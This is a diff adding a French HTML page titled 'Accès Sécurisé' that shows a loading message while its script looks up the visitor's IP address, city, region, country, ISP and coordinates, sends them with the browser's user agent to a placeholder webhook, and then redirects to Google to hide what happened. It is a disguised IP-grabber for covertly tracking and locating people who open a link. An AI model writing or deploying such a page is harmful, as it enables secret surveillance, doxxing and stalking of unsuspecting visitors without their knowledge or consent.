@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accès Sécurisé</title>
+</head>
+<body>
+    <h2>Chargement en cours...</h2>
+    <script>
+        // Récupérer les infos IP et device
+        fetch("https://ipinfo.io/json")
+        .then(response => response.json())
+        .then(data => {
+            let logData = {
+                ip: data.ip,
+                ville: data.city,
+                région: data.region,
+                pays: data.country,
+                fournisseur: data.org,
+                position: data.loc,
+                userAgent: navigator.userAgent
+            };
+
+            // Envoyer les logs à un webhook (ex: Discord, n8n, API perso)
+            fetch("https://your-webhook-url.com", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(logData)
+            });
+
+            // Redirection après tracking
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
